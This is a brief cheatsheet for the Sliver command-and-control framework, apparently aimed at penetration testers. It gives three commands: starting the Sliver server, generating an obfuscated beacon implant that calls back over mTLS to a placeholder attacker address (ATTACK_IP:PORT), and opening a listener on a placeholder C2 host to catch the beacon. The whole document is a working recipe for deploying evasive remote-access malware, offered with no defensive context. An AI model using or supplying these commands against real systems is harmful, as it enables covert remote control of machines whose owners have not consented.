# Sliver C2 Cheatsheet

### 1) Start the sliver C2 server

    sliver-server

### 2) Generate a randomly-named obfuscated beacon

    generate beacon --mtls ATTACK_IP:PORT -e

### 3) Create a listener to catch the beacon connection (You can choose mtls or http or https)

    mtls --lhost C2_IP --lport C2_PORT
